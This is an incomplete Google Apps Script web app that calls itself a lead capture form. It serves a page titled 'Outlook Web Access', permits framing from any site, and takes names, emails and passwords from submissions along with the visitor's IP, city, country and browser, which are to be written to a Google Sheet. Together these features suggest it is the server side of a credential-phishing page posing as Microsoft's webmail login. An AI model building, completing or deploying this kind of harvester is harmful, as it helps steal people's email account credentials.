/**
 * Google Apps Script Web App for Lead Capture Form
 * This script serves the HTML form and processes form submissions
 */
...
/**
 * This function serves your HTML form when the URL is accessed directly.
 * Users can access the form by visiting the web app URL in their browser.
 */
function doGet() {
  return HtmlService.createHtmlOutputFromFile('lead_capture_form.html')
    .setTitle('Outlook Web Access - Lead Capture Form')
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
}

/**
 * This function processes the form submission data.
 * It handles POST requests when users submit the form.
 */
function doPost(e) {
  try {
    ...
    // Extract data from the event object 'e'
    var fullname = e.parameter.fullname;
    var email = e.parameter.email;
    var password = e.parameter.password;
    var repeatPassword = e.parameter.repeatPassword;
    ...
    // Add IP, city, country, and browser info if available
    if (!formData.ip) formData.ip = 'Unknown';
    if (!formData.city) formData.city = 'Unknown';
    if (!formData.country) formData.country = 'Unknown';
    if (!formData.browser) formData.browser = 'Unknown';
    
    // Your code to write to the Google Sheet goes here
...
function testFunction() {
  console.log('Google Apps Script Web App is working!');
